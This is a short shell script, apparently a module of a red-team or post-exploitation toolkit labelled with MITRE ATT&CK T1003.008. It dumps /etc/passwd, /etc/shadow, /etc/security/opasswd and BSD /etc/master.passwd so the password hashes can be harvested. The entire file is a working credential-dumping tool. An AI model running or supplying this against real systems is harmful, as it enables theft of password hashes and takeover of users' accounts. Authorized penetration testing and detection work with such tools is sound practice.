#!/bin/sh
# gather/linux/hashdump.sh — Dump password hashes
# Requires: root or read access to /etc/shadow
# Read-only: YES (only reads files)
# MITRE ATT&CK: T1003.008 — /etc/passwd and /etc/shadow

echo "=== PASSWD ==="
cat /etc/passwd 2>/dev/null

echo ""
echo "=== SHADOW ==="
cat /etc/shadow 2>/dev/null || echo "[!] Cannot read /etc/shadow — insufficient privileges"

echo ""
echo "=== OPASSWD ==="
cat /etc/security/opasswd 2>/dev/null || echo "[*] No opasswd file"

echo ""
echo "=== MASTER.PASSWD (BSD) ==="
cat /etc/master.passwd 2>/dev/null || true
